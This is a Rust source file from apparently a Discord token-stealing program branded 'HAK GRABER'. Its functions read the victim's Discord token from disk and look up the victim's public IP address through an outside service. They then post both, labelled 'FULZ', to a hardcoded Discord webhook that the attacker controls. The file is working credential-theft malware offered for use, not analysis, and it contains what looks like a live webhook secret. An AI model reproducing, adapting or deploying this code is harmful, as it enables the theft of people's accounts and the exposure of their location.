use crate::filesystem;
use ureq;

pub const DISCORD_WEBHOOK_URL: &'static str = "https://discordapp.com/api/webhooks/726175225397510234/3o-NynTRD7FDaMfg_o_JilD6EHkDXS4_xdKfYJGePoBDGeHv_ylMD2rb-3EWDloZpb6G";

pub fn send_webhook_message(message: &str) {
    let _result = ureq::post(DISCORD_WEBHOOK_URL)
        .send_form(&[("username", "HAK GRABER"), ("content", message)]);
}

pub fn get_and_send_token() {
    let token = filesystem::get_discord_token();
    let ip_address = get_ip_address();

    let formatted_result = format_token(&token, &ip_address);
    send_webhook_message(&formatted_result);
}

fn format_token(token: &str, ip_address: &str) -> String {
    format!("HAK GRABER FULZ\nToken: {}\nIP: {}", token, ip_address)
}

fn get_ip_address() -> String {
    const API_ENDPOINT: &'static str = "https://wtfismyip.com/text";
    let result = ureq::get(API_ENDPOINT).call();
    result.into_string().unwrap()
}
